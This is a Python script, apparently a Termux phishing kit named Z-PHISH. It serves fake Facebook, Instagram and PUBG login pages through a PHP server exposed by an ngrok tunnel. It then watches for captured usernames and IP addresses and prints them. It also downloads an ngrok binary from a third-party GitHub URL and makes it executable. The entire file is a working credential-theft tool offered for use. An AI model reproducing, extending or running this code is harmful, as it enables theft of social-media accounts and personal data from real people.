import os,json
import time
from colorama import Fore
from re import search
from os.path import isfile
import requests,sys
try:
    import colorama,requests
except ImportError:
    os.system('pip3 install colorma')
    os.system('pip3 install requests')
def get_ngrok_url():
    global a
    url = "http://localhost:4040/api/tunnels"
    res = requests.get(url)
    res_unicode = res.content.decode("utf-8")
    res_json = json.loads(res_unicode)
    a =  res_json["tunnels"][0]["public_url"]


try:
    os.system("killall ngrok > /dev/null 2>&1 & ")
    os.system("killall php > /dev/null 2>&1 & ")

except:
    pass
exit_code = os.system('command -v ngrok > /dev/null 2>&1')
if exit_code == 0:
    pass
else:

    os.system ('clear')
    print ('\033[96m [✓] Downloading Ngrok File.......')
    os.system("curl https://raw.githubusercontent.com/ITSN0B1T4/ngrok/main/ngrok --output /data/data/com.termux/files/usr/bin/ngrok")
    os.system ("chmod +x /data/data/com.termux/files/usr/bin/ngrok")
    print("First Singup The https://ngrok.com/ and get the authtoken ")
    token = input("Please enter key only \nEnter authtoken: ")
    os.system(f"ngrok authtoken {token}")
def start(site):
    os.system("ngrok http 5555 > /dev/null 2>&1 &")
    print(f'{Fore.YELLOW}\n[+] Starting PHP Server...')
    time.sleep(3)
    os.system(f"php -S localhost:5555 -t server/{site} > /dev/null 2>&1 & ")
    get_ngrok_url()

    print(f'{Fore.GREEN}\n[+] Link: {a}')
    print(f'{Fore.YELLOW}\n[+] Please Wait.....')
    while True:
        if os.path.isfile(f'server/{site}/usernames.txt'):
            print(f'{Fore.GREEN}\n[*] User Found! {Fore.WHITE}')
            os.system(f"cat server/{site}/usernames.txt")
            os.system(f"rm -rf server/{site}/usernames.txt")
            print(f"{Fore.CYAN}="*50)
        if os.path.isfile(f'server/{site}/ip.txt'):
            print(f'{Fore.GREEN}\n[!] IP Found!{Fore.WHITE}')
            os.system(f"cat server/{site}/ip.txt")
            os.system(f"rm -rf server/{site}/ip.txt")
            print(f"{Fore.CYAN}="*50)

def slect():
    os.system("clear")
    os.system("figlet Z-PHISH | lolcat")
    print(f"""{Fore.CYAN}
    [1] Facebook   [2] PUBG

    [3] Instagram  [0] Exit
    """)
    choo = int(input('\nEnter Number:  '))
    if choo == 1:
        print("[1] Facebook")
        print("[2] Facebook_security")
        a = int(input("\nEnter Number : "))
        if a == 1:
          site = "facebook"
          start(site)
        elif a == 2:
            site = "fb_security"
            start(site)
        else:
            slect()
    elif choo == 2:
        site = "pubg"
        start(site)
    elif choo == 3:
        site ="instagram"
        start(site)
    elif choo == 0:
        exit()
    else:
        print(f'{Fore.RED}\n[!] Error Invalit Number!')
        time.sleep(2)
        slect()
slect()